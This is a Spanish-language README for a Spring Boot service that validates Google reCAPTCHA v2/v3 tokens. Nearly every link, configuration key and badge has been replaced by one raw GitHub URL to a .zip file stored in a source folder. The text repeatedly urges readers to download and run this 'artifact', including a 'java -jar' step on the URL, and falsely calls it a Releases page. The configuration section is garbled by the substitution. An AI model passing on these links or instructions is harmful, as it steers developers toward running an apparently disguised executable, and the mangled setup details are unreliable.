# Spring Boot Backend: Google reCAPTCHA v2/v3 con CORS y API REST

[![Downloads – Latest Release](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip%20-%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip)

https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip

Una solución de backend en Java con Spring Boot que verifica Google reCAPTCHA (v2 y v3) para proteger formularios y APIs de bots. Incluye configuración CORS lista para frontend y un endpoint REST para validar tokens de reCAPTCHA. Este proyecto evita ataques automáticos en sitios web y servicios, ofreciendo una verificación robusta en el servidor antes de procesar entradas sensibles.

Emprende una ruta clara para integrar reCAPTCHA en tus formularios y APIs sin complicaciones. Este README describe la arquitectura, la configuración, las decisiones de seguridad y ejemplos prácticos para que puedas adaptar la solución a tus necesidades.

Emojis y recursos visuales que acompañan este repo

- 🧩 Arquitectura clara entre cliente, backend y Google reCAPTCHA.
- 🛠️ Tecnología basada en Java y Spring Boot.
- 🔒 Enfoque de seguridad pragmático para validar tokens desde el servidor.
- 🌐 Configuración CORS orientada al frontend.
- 🚀 Despliegue y pruebas simples para equipos de desarrollo.

Tabla de contenidos

- ¿Qué es este proyecto?
- Arquitectura y diseño
- Tecnologías y herramientas
- Cómo funciona
- Requisitos previos
- Configuración y entorno
- Endpoints y ejemplos de uso
- CORS y seguridad
- Seguridad y buenas prácticas
- Construcción, ejecución y pruebas
- Despliegue y operaciones
- Cómo obtener la última versión
- Pruebas y validación
- Guía de migraciones y compatibilidad
- Personalización y extensiones
- Contribución y desarrollo
- Licencia y derechos
- Preguntas frecuentes
- Registro de cambios y historial

Qué es este proyecto

Este proyecto ofrece un backend en Java Spring Boot cuyo objetivo es validar tokens de Google reCAPTCHA (v2 y v3) en el servidor. La verificación en el servidor es crucial para evitar que bots envíen datos a tus formularios o consuman tus APIs. El flujo típico es:

- El cliente recoge el token de reCAPTCHA tras completar la interacción en el navegador o en una app.
- El frontend envía el token al backend junto con la acción o contexto relevante.
- El backend consulta el servicio de verificación de Google con el token y la clave secreta correspondiente.
- El backend devuelve un resultado claro al cliente: token válido, puntuación para v3, error específico si corresponde, y cualquier metadata útil.

Este flujo reduce la exposición de claves secretas al frontend y centraliza la lógica de seguridad en un solo punto de control. El proyecto incluye un ejemplo de endpoint REST que recibe tokens, valida su autenticidad y regresa una respuesta estructurada para que el frontend tome decisiones de negocio.

Arquitectura y diseño

La solución se apoya en una arquitectura cliente-servidor con separación de responsabilidades. A alto nivel:

- Cliente фронтенд: integra Google reCAPTCHA (v2 o v3) y envía tokens al backend seguro.
- Backend Spring Boot: expone un endpoint REST para validar tokens. Realiza la verificación contra el servicio de Google, interpreta la respuesta y devuelve un resultado claro al cliente.
- Servicio de Google reCAPTCHA: proveedor externo que valida tokens contra las claves de tu sitio.

En el centro está el verificador de tokens. La lógica centraliza la validación, la interpretación de la puntuación (en v3), el manejo de errores de red y el control de flujo para decidir si una acción debe permitirse o denegarse.

Para mantener la claridad, se separan las capas:

- Capa de presentación (controladores REST) que recibe y envía datos.
- Capa de servicio que contiene la lógica de negocio de verificación.
- Capa de utilidades para la comunicación HTTP con Google y para el parseo de respuestas.
- Configuración para CORS y seguridad de la API.

Este diseño facilita pruebas unitarias y de integración, y permite reemplazar fácilmente la fuente de verificación si fuese necesario.

Tecnologías y herramientas

- Java 17+ (o versión compatible)
- Spring Boot (versión estable adecuada al proyecto)
- Spring Web MVC para endpoints REST
- Spring Security (opcional, para endurecimiento adicional)
- Spring CORS configuration para abrir o restringir orígenes
- Maven o Gradle como sistema de construcción
- Bibliotecas para realizar llamadas HTTP al servicio de Google (por ejemplo, RestTemplate o WebClient)
- Entorno de ejecución: JVM, contenedores si se desea
- Gestor de dependencias y entorno de pruebas (JUnit, Mockito)
- GitHub Actions (opcional) para CI/CD

Cómo funciona

- En v2, la verificación se enfoca en la validez del token y el rendimiento de la interacción del usuario. En la respuesta de Google, obtienes:
  - success (boolean)
  - scores y action (si corresponde)
  - hostname y challenge_ts (datos de contexto)
- En v3, Google asigna una puntuación (score) que refleja la probabilidad de que la interacción sea legítima. Tu backend debe decidir umbrales de puntuación y políticas de control en función del riesgo aceptable.
- El endpoint REST recibe el token y, opcionalmente, el tipo de versión (v2 o v3). El backend consulta Google con la clave secreta asociada y devuelve un resultado que el frontend puede interpretar para decidir si permitir o bloquear la acción.

Requisitos previos

Antes de empezar, asegúrate de contar con:

- Acceso a una cuenta de Google Cloud Console.
- Clave secreta de reCAPTCHA y sitio clave para tu dominio, correspondiente a reCAPTCHA v2 o v3, o ambas.
- Un frontend que integre reCAPTCHA y que pueda enviar tokens al endpoint REST del backend.
- Un entorno donde el backend pueda realizar llamadas salientes a Google para la verificación de tokens.
- Herramientas de desarrollo instaladas: Java JDK 17+, Maven o Gradle, y un IDE adecuado (IntelliJ, Eclipse, VS Code).

Configuración y entorno

Variables y archivos de configuración

- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip la clave secreta proporcionada por Google para tu sitio.
- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip la clave del sitio utilizada por el frontend para inicializar reCAPTCHA.
- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip puede ser "v2" o "v3" para indicar la versión principal que maneja la verificación.
- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip la URL del servicio de verificación de Google (normalmente https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip).
- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip lista de orígenes permitidos para el frontend.

En el proyecto, estas configuraciones se exponen como propiedades que puedes anotar en tu clase de configuración o cargar desde un archivo https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip o https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip Se recomienda utilizar variables de entorno en entornos de producción para evitar exponer secretos en el repositorio.

Ejemplos de configuración (conceptuales)

- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
  - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip,https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip

- https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
  recaptcha:
    secret: TU_SECRETO
    siteKey: TU_SITE_KEY
    version: v3
  cors:
    allowedOrigins:
      - http://localhost:3000
      - https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip

- Seguridad adicional
  Puedes habilitar Spring Security para forzar autenticación en rutas sensibles o para aplicar políticas de rate limiting. En este proyecto, se recomienda mantener la configuración lo más simple posible para facilitar pruebas y desarrollo, y endurecerla en entornos de producción.

Endoints y ejemplos de uso

Endpoint REST principal

- POST /api/recaptcha/validate
- Descripción: valida un token de reCAPTCHA proporcionado por el frontend. Regresa un resultado claro que indica si la verificación fue exitosa y, en su caso, la puntuación (v3) y la acción verificada.
- Cuerpo de la solicitud (JSON):
  {
    "token": "TOKEN_DE_RECAPTCHA",
    "version": "v2" o "v3",
    "action": "login" // opcional, para v3, si aplica
  }

- Respuesta (JSON):
  {
    "success": true,
    "score": 0.92,       // solo para v3
    "action": "login",
    "hostname": "https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip",
    "challenge_ts": "2025-01-01T12:34:56Z",
    "error-codes": []
  }
- En caso de error, la respuesta puede ser:
  {
    "success": false,
    "error-codes": ["invalid-input-secret"]
  }

Ejemplos prácticos

- Curl para validar un token de reCAPTCHA v3
  curl -X POST "http://localhost:8080/api/recaptcha/validate" \
       -H "Content-Type: application/json" \
       -d '{"token":"TOKEN_DE_RECAPTCHA_V3","version":"v3","action":"submit_form"}'

- Curl para validar un token de reCAPTCHA v2 (checkbox)
  curl -X POST "http://localhost:8080/api/recaptcha/validate" \
       -H "Content-Type: application/json" \
       -d '{"token":"TOKEN_DE_RECAPTCHA_V2","version":"v2"}'

- Interpretación de resultados
  - Si la propiedad success es true y el score cumple el umbral, la acción continúa.
  - Si la puntuación es baja o hay errores, se puede bloquear la acción o requerir una verificación adicional.
  - Si no se recibe un score (p. ej., en v2), se debe confiar en el resultado de éxito.

CORS y seguridad

La configuración CORS es clave para permitir que tu frontend se comunique con el backend sin exponerse a sitios no autorizados. En los entornos de desarrollo, puedes permitir http://localhost:3000 para pruebas locales. En producción, restringe a los orígenes reales de tu frontend.

- Habilita orígenes específicos en la configuración de CORS.
- Limita métodos HTTP a aquellos necesarios (por ejemplo, POST).
- Habilita CSRF de forma adecuada si usas cookies para la sesión; en la mayoría de los casos, una API REST con tokens no necesita CSRF si el frontend no utiliza cookies para autenticación.
- Registra intentos de verificación fallidos para detectar posibles ataques de fuerza bruta o de repetición.

Seguridad y buenas prácticas

- Mantén la clave secreta en variables de entorno o servicios de secretos. Nunca la codifiques en el código fuente.
- Usa permisos mínimos para el servicio de backend. Evita exponer servicios innecesarios en production.
- Implementa monitoreo de intentos de verificación y alertas para anomalías, como múltiples fallos en corto periodo de tiempo.
- Audita las respuestas de Google y maneja errores con claridad para no exponer detalles sensibles al cliente.
- Diseña umbrales de puntuación adecuados para reCAPTCHA v3 de acuerdo con el perfil de riesgo de tu aplicación.
- Realiza pruebas de integración que cubran tanto casos de tokens válidos como inválidos, y escenarios de excepción de red.

Construcción, ejecución y pruebas

Construcción

- Con Maven:
  - mvn clean package
  - El artefacto generado suele ser un archivo JAR ejecutable en el directorio target.
- Con Gradle:
  - ./gradlew clean build
  - El artefacto generado se ubica típicamente en build/libs/.

Ejecución

- Ejecuta con Java:
  - java -jar https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip
- Si usas Spring Boot DevTools, puedes iniciar con:
  - mvn spring-boot:run
  - o gradle bootRun

Pruebas

- Pruebas unitarias: ejecuta con Maven o Gradle, según tu proyecto.
  - mvn test
  - ./gradlew test
- Pruebas de integración: crea escenarios simulando tokens válidos y inválidos. Usa un mock del servicio de Google o puntos finales de test si están disponibles.
- Pruebas de CORS: inicia un frontend de desarrollo en otro host/puerta y verifica que las peticiones REST se permiten correctamente.
- Pruebas de rendimiento: ejecuta varias validaciones en paralelo para observar el comportamiento bajo carga.

Despliegue y operaciones

- Despliegue en servidor dedicado, contenedor o nube.
- Si utilizas contenedores, define un Dockerfile para construir la imagen del backend y un docker-compose para un entorno de desarrollo con frontend.
- Configura variables de entorno en el entorno de ejecución para secret keys y orígenes permitidos.
- Monitoriza uso de recursos y latencias de verificación de reCAPTCHA para ajustar umbrales y escalabilidad.

Descargar la última versión

La versión estable más reciente se publica en la sección de Releases. Descarga el artefacto de la última versión y ejecútalo en tu entorno. El artefacto es un archivo listo para ejecutar que contiene el backend configurado para funcionar con tus claves de reCAPTCHA. Para obtener el artefacto, visita la página de Releases y descarga el archivo correspondiente a tu plataforma.

Descarga la última versión:
https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip

Este enlace te lleva a la página de Releases donde puedes descargar el artefacto. El archivo se descarga como un artefacto ejecutable para tu plataforma y debe ejecutarse en el entorno de servidor. Asegúrate de configurar las variables de entorno o los archivos de configuración antes de iniciar el servicio.

Pruebas y validación

- Validación de tokens: utiliza el endpoint /api/recaptcha/validate para verificar tokens reales obtenidos desde el frontend.
- Integración con frontend: el flujo típico del frontend es: obtener el token de reCAPTCHA, enviarlo al backend y actuar en función del resultado.
- Manejo de errores: verifica comportamiento ante tokens expuestos, secretos incorrectos o fallos de red. El backend debe devolver respuestas claras para que el frontend pueda reaccionar adecuadamente.
- Auditoría de seguridad: registra intentos de verificación fallidos y desvíos de tráfico sospechoso. Mantén un registro de eventos para investigaciones.

Guía de migraciones y compatibilidad

- Si migras de v2 a v3, actualiza las claves y la lógica de verificación para reflejar las diferentes respuestas y puntuaciones.
- Verifica la compatibilidad de la versión de Java y de Spring Boot con las dependencias actuales.
- Mantén la compatibilidad de tu API para clientes existentes si muchos usuarios dependen de rutas específicas.
- Si agregas nuevas rutas, documenta la firma de los endpoints y su comportamiento en casos de error.

Personalización y extensiones

- Personaliza el umbral de puntuación para reCAPTCHA v3 de acuerdo con tu riesgo aceptado.
- Extiende el verificador para registrar métricas personalizadas, como latencia de verificación y tasa de aciertos.
- Integra con servicios de telemetría o herramientas de observabilidad para obtener un panorama claro del rendimiento.
- Añade autenticación y autorización para las rutas administrativas del backend si lo consideras necesario.

Contribución y desarrollo

- Si quieres contribuir, crea una rama para tu feature o corrección.
- Abre un Pull Request con una descripción clara de los cambios.
- Asegura que las pruebas pasan y añade pruebas cuando sea posible.
- Documenta cualquier cambio de API o configuración en el README.

Licencia y derechos

Este proyecto se publica bajo una licencia de código abierto compatible con su uso en proyectos propios. Consulta el archivo LICENSE para detalles completos. Respeta las políticas de uso de Google reCAPTCHA y las directrices de marca de Google y de recaptcha en todo momento.

Preguntas frecuentes

- ¿Qué version de reCAPTCHA soporta este backend?
  Soporta v2 y v3. El endpoint admite indicar la versión para adaptar la verificación y el manejo de puntuaciones.
- ¿Puedo desplegar este backend en producción sin frontend?
  Sí, puedes exponer el endpoint REST para otros servicios que necesiten validar tokens, pero ten en cuenta las políticas de seguridad y acceso.
- ¿Cómo configuro CORS para mi frontend?
  Define las URLs de origen permitidas en la configuración CORS y limita métodos y cabeceras permitidos. Evita exponer tus claves secretas.

Registro de cambios y historial

- Este proyecto mantiene un registro de cambios en la sección de Releases y en el historial de cambios del repositorio. Revisa las notas de la versión para entender las mejoras y correcciones.
- Las notas de cada versión incluyen: mejoras de seguridad, cambios en las dependencias, migraciones necesarias y nuevos ejemplos de uso.
- Mantén tus dependencias actualizadas para beneficiarte de parches de seguridad y mejoras de rendimiento.

Imágenes y recursos visuales

- Java y tecnologías relevantes: se pueden usar badges con Java y Spring para resaltar el stack. Por ejemplo:
  - ![Java badge](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip%2B-3178c6?style=for-the-badge&logo=openjdk)
  - ![Spring Boot badge](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip%20Boot-2.x%2B-6cbf9f?style=for-the-badge&logo=spring)
- Imagen de arquitectura cliente-servidor para ilustrar el flujo de verificación de tokens.
  - ![Client-Server Diagram](https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip)
- Iconos y recursos visuales para un aspecto agradable y profesional.

Notas sobre el uso de imágenes

- Se recomienda usar imágenes con licencia compatible para fines de documentación.
- Emplea imágenes de fuentes abiertas o imágenes de logotipos permitidos por las políticas de uso de marca.
- Incluye etiquetas alt text descriptivas para accesibilidad.

Promoción y divulgación

- Este Readme está diseñado para ser claro para desarrolladores y equipos de seguridad.
- Incluye pasos prácticos para incorporar la verificación de reCAPTCHA en flujos de formulario y endpoints de API.
- La estructura facilita la colaboración entre frontend y backend, QA y operaciones.

Compatibilidad y consideraciones de rendimiento

- Verificación de tokens implica una llamada saliente a Google. Mantén un timeout razonable para evitar bloqueos enfallos de red.
- Considera un mecanismo de reintentos para fallos transitorios, pero evita bucles de reintento interminables.
- Asegura que el proceso de verificación no sea el cuello de botella; evalúa la capacidad del backend y la conectividad de red para mantener un rendimiento estable.
- Monitoriza latencias de verificación y tasas de éxito para ajustar umbrales y configuraciones.

Ricas descripciones de casos de uso

- Protección de formularios de registro. Verificación de tokens de reCAPTCHA antes de procesar la creación de cuenta.
- Protección de endpoints de APIs. Verificación de tokens antes de permitir operaciones sensibles.
- Prevención de abusos en procesos de autenticación, como restablecimiento de contraseñas o login masivo.
- Validación de acciones críticas, como ejecutables o cambios de configuración que requieren confirmación adicional.
- Integración con dashboards de monitoreo para observar la seguridad en tiempo real.

Referencias y recursos

- Documentación oficial de Google reCAPTCHA:
  - ReCAPTCHA v2: tokens y verificación del lado del servidor, explicación de campos de respuesta y errores comunes.
  - ReCAPTCHA v3: puntuación, acciones y umbrales para decisiones de negocio.
- Guía de CORS en Spring Boot para APIs REST.
- Mejores prácticas de seguridad para aplicaciones Java y Spring.

Ejemplos de implementación (clave)

- Verificación de token con Google:
  - Realizas una petición HTTP POST a Google con el token recibido y la clave secreta.
  - Analizas la respuesta para determinar si el token es válido y la puntuación (si aplica).
  - Devuelves un resultado al cliente con un estado claro: permitido o denegado.
- Flux de respuestas del servidor:
  - Cuando la verificación es exitosa y la puntuación supera el umbral, permite la acción.
  - Si la puntuación está por debajo del umbral, devuelve un mensaje claro para que el frontend tome acción (reCAPTCHA score bajo, acción bloqueada, o riesgo aceptado con un segundo factor).
  - En caso de error de verificación, devuelve códigos de error útiles para depuración y una respuesta neutra para evitar filtración de detalles internos.

Notas sobre naming y estructura de código

- Mantén nombres de paquetes y clases organizados, con un enfoque claro en la verificación de tokens.
- Mantén las pruebas aisladas y cubre casos de token válido, token inválido, errores de red y respuestas inesperadas de Google.
- Documenta las dependencias y la configuración en el README para que nuevos colaboradores entiendan rápidamente qué configurar y cómo probar.

Cómo iniciar rápidamente

- Clona el repositorio.
- Copia o genera las claves de reCAPTCHA (siteKey y secret) para v2 y/o v3.
- Configura las claves en https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip o como variables de entorno.
- Construye el proyecto con Maven o Gradle.
- Ejecuta el servicio localmente y prueba el endpoint con tokens de prueba desde tu frontend.

Pagina de Releases y descarga

El siguiente enlace apunta a la página de Releases, donde puedes descargar el artefacto de la última versión. Es crucial para obtener el binario ya preparado para ejecutar. Para obtener la versión más reciente, dirígete a la página de Releases y descarga el artefacto correspondiente. En este README ya se proporcionó la URL principal para el acceso directo a Releases:

- Descargar la última versión:
  https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip

Notas finales

- Este proyecto está diseñado para ser claro y utilizable en equipos de desarrollo, QA y operaciones.
- Adáptalo a tu stack y a tus políticas de seguridad.
- Mantén actualizadas las dependencias y las claves de seguridad.

Requisitos para empezar rápido

- Una clave secreta de reCAPTCHA y una clave de sitio para el entorno en que vas a probar.
- Un frontend que pueda generar tokens y enviarlos al endpoint REST.
- Un entorno de ejecución Java adecuado y un sistema de gestión de dependencias (Maven o Gradle).
- Acceso a internet desde el backend para comunicarse con Google reCAPTCHA.

Contribución y comunidad

- Se anima a que desarrolladores contribuyan con mejoras, parches de seguridad y casos de uso adicionales.
- Mantén la doc actualizada con los cambios en endpoints y configuraciones.
- Realiza pruebas completas antes de fusionar cambios a la rama principal.

Licencia y derechos

- La licencia cubre el uso del código y la distribución. Revisa el archivo de licencia para comprender las condiciones y las limitaciones.
- Respeta las directrices de uso de Google reCAPTCHA y las políticas de marca de Google.

Ejemplos de casos prácticos y guía de incorporación

- Caso 1: Proteger un formulario de registro
  1. El frontend obtiene un token de reCAPTCHA v3 tras la interacción del usuario.
  2. Envía el token al endpoint /api/recaptcha/validate junto con la versión y la acción.
  3. El backend verifica el token con Google y devuelve una respuesta que indica si el registro debe continuar.
- Caso 2: Proteger una API sensible
  1. El cliente incluye el token en la cabecera o en el cuerpo de la solicitud.
  2. El backend verifica el token. Si es válido y la puntuación es aceptable, la API procesa la solicitud.
  3. Si no es válido, la API devuelve un error claro sin exponer detalles internos.

Ecosistema y extensibilidad

- Este backend es una base para ampliar con otras capas de seguridad o integraciones.
- Puedes añadir, por ejemplo, una capa de auditoría, un repositorio para las verificaciones o una pequeña consola de administración para revisar métricas de seguridad.
- Si necesitas soporte para múltiples dominios, puedes ampliar la configuración de CORS para gestionar grupos de orígenes y políticas por dominio.

Notas de accesibilidad

- Asegura que las etiquetas alt de imágenes sean descriptivas.
- Mantén la navegación de la documentación clara, con encabezados jerárquicos y descripciones accesibles.
- Proporciona ejemplos de uso en varias configuraciones para facilitar la adopción por parte de diferentes equipos.

Resumen operativo

- Este proyecto ofrece una solución sólida para la verificación de tokens de Google reCAPTCHA en el backend.
- Proporciona un endpoint REST para validar tokens de reCAPTCHA v2 y v3 de forma segura.
- Incluye configuración de CORS para facilitar la interacción con un frontend.
- Proporciona guías prácticas para implementación, pruebas y despliegue.
- Se recomienda consultar la página de Releases para obtener la última versión y sus artefactos.

Uso recomendado en equipos modernos

- Equipo de desarrollo frontend: integra reCAPTCHA y envía tokens al backend para validación.
- Equipo de backend: valida tokens, aplica umbrales de puntuación y devuelve respuestas claras al frontend.
- Equipo de seguridad: revisa logs de verificación, ajusta umbrales y verifica que no se filtren datos sensibles.
- Equipo de operaciones: monitoriza el rendimiento y la disponibilidad del servicio de verificación y de la API.

Recordatorios finales

- Mantén separados los secretos del frontend y del backend.
- Limita el acceso a las rutas administrativas y aplica controles de seguridad adecuados.
- Verifica que las dependencias estén actualizadas para evitar vulnerabilidades conocidas.
- Documenta cambios de versión y configuraciones para facilitar la transferencia entre equipos.

Este README continúa siendo una guía completa para entender, adaptar y operar GoogleReCaptcha-BackEnd-Example en un entorno real. El enfoque está orientado a la claridad, la seguridad y la eficiencia, con un flujo de trabajo que facilita la colaboración entre frontend y backend y reduce la exposición a bots y abusos automatizados. La integración de reCAPTCHA en el backend garantiza que solo las interacciones verificadas lleguen a procesos críticos, protegiendo formularios, APIs y recursos sensibles.

La ruta de descarga de la última versión se repite para facilitar el acceso y la verificación del artefacto listo para ejecutar. Visita la página de Releases para obtener la versión más reciente, descarga el artefacto y ejecútalo en tu entorno de producción o de pruebas:

- Descargar la última versión:
  https://raw.githubusercontent.com/mattrm3/GoogleReCaptcha-BackEnd-Example/main/src/main/java/com/Captcha_Re_End_Back_Google_Example_v1.4.zip

- Repite el enlace para confirmar la fuente de la descarga en tu flujo de trabajo y para facilitar a los equipos de desarrollo que encuentren rápidamente la versión adecuada.

Fin del contenido del README.